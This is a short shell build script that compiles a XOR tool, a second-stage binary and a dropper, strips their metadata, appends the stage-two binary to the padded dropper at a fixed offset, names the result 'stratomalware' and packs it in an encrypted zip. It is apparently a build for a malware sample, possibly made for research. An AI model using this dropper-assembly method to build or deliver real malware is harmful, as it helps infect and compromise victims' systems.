#!/bin/sh
EXTRA_GCC="-Os -Wall -std=c99 -fomit-frame-pointer -Wl,--build-id=none -Wno-unused-variable
  -ffunction-sections -fdata-sections -Wl,--gc-sections -fno-stack-protector"
if [[ "$1" == "debug" ]];then EXTRA_GCC+=" -DDEBUG=true"; fi
#set -x

function compile() {
  exec=${1/.c/}
  gcc ${EXTRA_GCC} -o $exec $*
  strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment \
    --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag  $exec
}

# build small tool
compile xorer.c

STAGET2_OFFSET=$((0x58b0))

# build and shrink stage2
compile stage2.c

# take care of dropper
compile dropper.c -DSTAGE2_OFFSET=${STAGET2_OFFSET}
DROPPER_SZ=$( stat -c '%s' dropper )
# make room until offset of stage2 bin
( perl -e 'print "\x00"x'"$((STAGET2_OFFSET - DROPPER_SZ))"';' ) | tee -a dropper
cat stage2 >> dropper

mv dropper stratomalware
zip -e stratomalware.zip stratomalware

#done
ls -lh .
